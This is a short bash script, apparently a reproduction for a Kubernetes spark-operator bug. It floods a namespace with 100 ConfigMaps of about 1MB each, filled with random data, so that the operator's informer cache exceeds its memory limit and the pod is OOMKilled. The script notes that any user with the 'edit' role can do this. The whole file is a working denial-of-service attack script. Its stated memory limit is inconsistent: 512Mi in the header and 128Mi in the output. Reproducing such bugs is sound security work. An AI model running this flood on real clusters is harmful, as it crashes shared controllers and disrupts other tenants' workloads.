#!/usr/bin/env bash
# Inject ConfigMap flood to trigger operator OOMKill.
# Uses 100 ConfigMaps at ~1MB each (the Kubernetes maximum).
# The informer deserializes these into typed Go structs with 3-5x overhead,
# exceeding the 512Mi memory limit.
#
# Reference: kubeflow/spark-operator#2878
set -euo pipefail

NAMESPACE="${NAMESPACE:-demo-controllers}"
CONFIGMAP_COUNT="${CONFIGMAP_COUNT:-100}"
BATCH_SIZE=10

echo "==> Generating ~1MB attack payload (Kubernetes ConfigMap size limit)..."
dd if=/dev/urandom bs=1024 count=750 of=/tmp/oomkill-payload.bin 2>/dev/null
base64 /tmp/oomkill-payload.bin > /tmp/oomkill-payload.txt
truncate -s 1000000 /tmp/oomkill-payload.txt
rm -f /tmp/oomkill-payload.bin
echo "    Payload size: $(wc -c < /tmp/oomkill-payload.txt) bytes"

echo "==> Flooding ${CONFIGMAP_COUNT} ConfigMaps into ${NAMESPACE}..."
echo "    Any user with the standard 'edit' ClusterRole can do this."
echo ""

for i in $(seq 1 "${CONFIGMAP_COUNT}"); do
    kubectl create configmap "app-config-${i}" \
        --from-file=data=/tmp/oomkill-payload.txt \
        -n "${NAMESPACE}" 2>/dev/null &
    if [ $((i % BATCH_SIZE)) -eq 0 ]; then
        wait
        echo "    Created: ${i}/${CONFIGMAP_COUNT}"
    fi
done
wait

ACTUAL=$(kubectl get configmaps -n "${NAMESPACE}" --no-headers 2>/dev/null | grep -c "app-config" || echo "0")
echo ""
echo "==> ConfigMap flood complete: ${ACTUAL} ConfigMaps created."
echo "    Total data: ~${ACTUAL} MB"
echo "    Informer Go struct overhead: ~3-5x -> 300-500MB in cache"
echo "    Memory limit: 128Mi -> OOMKill expected within seconds."

rm -f /tmp/oomkill-payload.txt
